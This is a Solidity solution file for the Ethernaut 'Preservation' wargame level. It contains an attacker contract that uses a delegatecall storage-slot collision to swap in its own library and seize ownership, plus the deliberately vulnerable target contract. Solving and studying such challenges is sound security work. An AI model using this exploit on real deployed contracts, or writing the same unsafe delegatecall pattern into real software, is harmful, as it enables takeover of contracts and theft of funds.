pragma solidity ^0.6.0;

/**
 * Used to solve level 16 (Preservation) in Ethernaut. 
 * This was hard, but not annoying like the gatekeepers. My line of thinking went down the
 * wrong path because I thought that the 'storedTime' was at storage slot 0. Unbeknownst to me,
 * I had previously called setSecondTime!
 * The crux of it is that you can use setSecondTime to change timeZone1Library to a contract
 * address of your changing. I changed it to the contract below.
*/
contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    // lmao get bodied
    function setTime(uint _time) external {
        owner = 0xF8dac7973f0F444E19bf671915187A0A92f18313;
    }
}

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}